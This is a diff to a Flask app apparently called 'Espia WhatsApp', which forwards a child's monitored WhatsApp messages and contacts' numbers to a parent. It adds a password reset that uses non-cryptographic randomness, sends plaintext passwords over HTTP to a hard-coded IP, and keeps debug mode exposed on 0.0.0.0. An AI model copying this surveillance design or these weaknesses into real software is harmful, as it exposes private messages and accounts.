@@ -512,34 +512,41 @@ def disparar_relatorios():
     try:
         conn = get_db()
         cur = conn.cursor()
-        cur.execute("SELECT id, whatsapp_pai, telefones_monitorados, plano, data_criacao FROM usuarios WHERE whatsapp_pai IS NOT NULL")
+        cur.execute("SELECT id, whatsapp_pai, telefones_monitorados, plano, data_criacao, username FROM usuarios WHERE whatsapp_pai IS NOT NULL")
         usuarios = cur.fetchall()
 
-        for user_id, whatsapp_pai, telefones_monitorados, plano, data_criacao in usuarios:
+        for user_id, whatsapp_pai, telefones_monitorados, plano, data_criacao, username in usuarios:
             if not telefones_monitorados:
                 continue
             if plano == "Gratuito" and (datetime.now() - data_criacao).days > 2:
-                continue  # Ignora usuários com teste gratuito expirado
+                continue
 
             for numero_filho in telefones_monitorados:
                 if not numero_filho.startswith("+"):
                     numero_filho = f"+{numero_filho}"
                 ultimos_8 = numero_filho[-8:]
-                # Extrai o DDD do número do filho (após remover +55 ou 55)
                 ddd_filho = numero_filho.replace("+55", "").replace("55", "")[:2]
-                
-                # Consulta mensagens apenas se o DDD corresponde
+
+                # Busca nome do filho
                 cur.execute(
-                    "SELECT conteudo, horario FROM mensagens_monitoradas WHERE RIGHT(numero_filho, 8) = %s AND SUBSTRING(numero_filho FROM 3 FOR 2) = %s ORDER BY horario DESC",
+                    "SELECT nome_filho FROM filhos WHERE username_pai = %s AND whatsapp_filho = %s",
+                    (username, numero_filho)
+                )
+                nome_filho = cur.fetchone()
+                nome_filho = nome_filho[0] if nome_filho else "Sem nome"
+
+                # Consulta mensagens
+                cur.execute(
+                    "SELECT numero_contato, conteudo, horario FROM mensagens_monitoradas WHERE RIGHT(numero_filho, 8) = %s AND SUBSTRING(numero_filho FROM 3 FOR 2) = %s ORDER BY horario DESC",
                     (ultimos_8, ddd_filho)
                 )
                 mensagens = cur.fetchall()
                 if not mensagens:
                     continue
 
-                corpo = f"Relatório de mensagens do número {numero_filho}:\n"
-                for conteudo, horario in mensagens:
-                    corpo += f"[{horario.strftime('%d/%m/%Y %H:%M')}] {conteudo}\n"
+                corpo = f"*Relatório para o filho {nome_filho}, número {numero_filho}*\n\n"
+                for numero_contato, conteudo, horario in mensagens:
+                    corpo += f"[{horario.strftime('%d/%m/%Y %H:%M')}] {numero_contato}: {conteudo}\n"
 
                 if not whatsapp_pai.startswith("+"):
                     whatsapp_pai = f"+{whatsapp_pai}"
@@ -550,7 +557,6 @@ def disparar_relatorios():
                         "mensagem": corpo
                     }, timeout=10)
                     response.raise_for_status()
-                    # Remove apenas as mensagens correspondentes ao DDD
                     cur.execute(
                         "DELETE FROM mensagens_monitoradas WHERE RIGHT(numero_filho, 8) = %s AND SUBSTRING(numero_filho FROM 3 FOR 2) = %s",
                         (ultimos_8, ddd_filho)
@@ -612,6 +618,45 @@ def admin():
     usuarios = cur.fetchall()
     conn.close()
     return render_template("admin.html", usuarios=usuarios)
+
+@app.route("/forgot_password", methods=["POST"])
+def forgot_password():
+    whatsapp_pai = request.form["whatsapp_pai"].strip()
+    if not whatsapp_pai.startswith("+"):
+        whatsapp_pai = f"+{whatsapp_pai}"
+    if not re.match(r"^\+\d{12,13}$", whatsapp_pai):
+        return render_template("index.html", erro="Número de WhatsApp inválido.")
+
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("SELECT id FROM usuarios WHERE whatsapp_pai = %s", (whatsapp_pai,))
+    user = cur.fetchone()
+    if not user:
+        conn.close()
+        return render_template("index.html", erro="Usuário não encontrado.")
+
+    # Gera nova senha de 7 caracteres (letras e números)
+    new_password = ''.join(random.choices(string.ascii_letters + string.digits, k=7))
+    password_hash = generate_password_hash(new_password)
+
+    # Atualiza a senha no banco
+    cur.execute("UPDATE usuarios SET password = %s WHERE id = %s", (password_hash, user[0]))
+    conn.commit()
+    conn.close()
+
+    # Envia a nova senha para o WhatsApp
+    try:
+        mensagem = f"Sua nova senha do Espia WhatsApp é: {new_password}"
+        response = requests.post("http://147.93.4.219:3000/enviar-confirmacao", json={
+            "numeros": [whatsapp_pai],
+            "mensagem": mensagem
+        }, timeout=10)
+        response.raise_for_status()
+    except Exception as e:
+        print(f"Erro ao enviar nova senha para {whatsapp_pai}: {str(e)}")
+        return render_template("index.html", erro="Erro ao enviar nova senha.")
+
+    return render_template("index.html", erro="Sua nova senha foi enviada para seu WhatsApp.")
 
 if __name__ == "__main__":
     app.run(debug=True, host="0.0.0.0", port=5000)
